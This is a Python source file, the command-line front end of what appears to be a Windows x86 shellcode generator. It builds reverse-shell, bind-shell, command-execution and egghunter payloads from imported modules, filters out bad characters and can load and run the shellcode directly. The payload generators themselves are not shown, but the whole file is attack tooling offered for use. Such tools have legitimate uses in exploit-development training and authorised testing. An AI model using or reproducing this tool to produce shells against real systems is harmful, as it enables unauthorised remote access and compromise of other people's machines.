import argparse
from ast import literal_eval

from coder import bind_shell, egghunter, exec_command, reverse_shell
from runner import load_shellcode, run_shellcode
from stones import assemble, disassemble_and_find_bad_chars

EXIT_FUNCTIONS = {
    "process": "TerminateProcess",
    "thread": "RtlExitUserThread",
    "none": None,
}


def parse_args():
    def setup_parser():
        parser = argparse.ArgumentParser(description="Windows x86 Shellcode Generator")
        parser.add_argument(
            "-b",
            "--badchars",
            required=False,
            help="Bad chars",
        )
        parser.add_argument(
            "--run_shellcode",
            action="store_true",
            required=False,
            help="Run shellcode",
        )
        parser.add_argument(
            "--use_windbg",
            action="store_true",
            required=False,
            help="Set int3 for windbg",
        )
        parser.add_argument(
            "-e",
            "--exit_func",
            required=False,
            choices=list(EXIT_FUNCTIONS.keys()),
            default="process",
            help="Exit Function",
        )
        return parser

    def setup_reverse_parser(subparsers):
        reverse_parser = subparsers.add_parser("reverse", help="Reverse shell")
        reverse_parser.add_argument(
            "-i",
            "--lhost",
            required=True,
            help="Local hostname",
        )
        reverse_parser.add_argument(
            "-p",
            "--lport",
            required=True,
            help="Local port",
        )
        return reverse_parser

    def setup_bind_parser(subparsers):
        bind_parser = subparsers.add_parser("bind", help="Bind shell")
        bind_parser.add_argument(
            "-p",
            "--rport",
            required=True,
            help="Remote port",
        )
        return bind_parser

    def setup_exec_parser(subparsers):
        exec_parser = subparsers.add_parser("exec", help="Execute command")
        exec_parser.add_argument(
            "-c",
            "--command",
            required=True,
            help="Command Line",
        )
        return exec_parser

    def setup_egghunter_parser(subparsers):
        egghunter_parser = subparsers.add_parser("egghunter", help="Egghunter")
        egghunter_parser.add_argument(
            "egghunter_type",
            choices=["ntaccess", "seh"],
            help="Egghunter type",
        )
        egghunter_parser.add_argument(
            "-t",
            "--tag",
            required=True,
            help="Tag",
        )
        return egghunter_parser

    parser = setup_parser()
    mode_subparsers = parser.add_subparsers(
        dest="mode", required=True, help="Shellcode mode"
    )

    setup_reverse_parser(mode_subparsers)
    setup_bind_parser(mode_subparsers)
    setup_exec_parser(mode_subparsers)
    setup_egghunter_parser(mode_subparsers)

    return parser.parse_args()


def generate_asm_code(args, bad_chars):
    if args.mode == "reverse":
        code = reverse_shell.generate(
            args.lhost,
            args.lport,
            bad_chars=bad_chars,
            exit_func=EXIT_FUNCTIONS[args.exit_func],
            debug=args.use_windbg,
        )

    elif args.mode == "bind":
        code = bind_shell.generate(
            args.rport,
            bad_chars=bad_chars,
            exit_func=EXIT_FUNCTIONS[args.exit_func],
            debug=args.use_windbg,
        )

    elif args.mode == "exec":
        code = exec_command.generate(
            args.command,
            bad_chars=bad_chars,
            exit_func=EXIT_FUNCTIONS[args.exit_func],
            debug=args.use_windbg,
        )

    elif args.mode == "egghunter":
        if args.egghunter_type == "ntaccess":
            code = egghunter.generate_ntaccess(args.tag, debug=args.use_windbg)

        elif args.egghunter_type == "seh":
            code = egghunter.generate_seh(args.tag, debug=args.use_windbg)

    return code


def main():
    args = parse_args()

    bad_chars = b"\x00"
    if args.badchars:
        bad_chars = literal_eval(f"b'{args.badchars}'")

    code = generate_asm_code(args, bad_chars)
    shellcode = assemble(code)
    print(f"# shellcode size: {hex(len(shellcode))} ({len(shellcode)})")

    contains_bad_chars = any(c in bad_chars for c in shellcode)
    if not contains_bad_chars:
        print(f"shellcode = {bytes(shellcode)}")
    else:
        asm = disassemble_and_find_bad_chars(shellcode, bad_chars)
        print(asm)
        print("\nBad chars found")

    if args.run_shellcode:
        ptr = load_shellcode(shellcode)
        print(f"Shellcode address: {hex(ptr)}")

        input("Press any key to execute shellcode...")
        run_shellcode(ptr)

        print("Shellcode thread terminated")


if __name__ == "__main__":
    main()
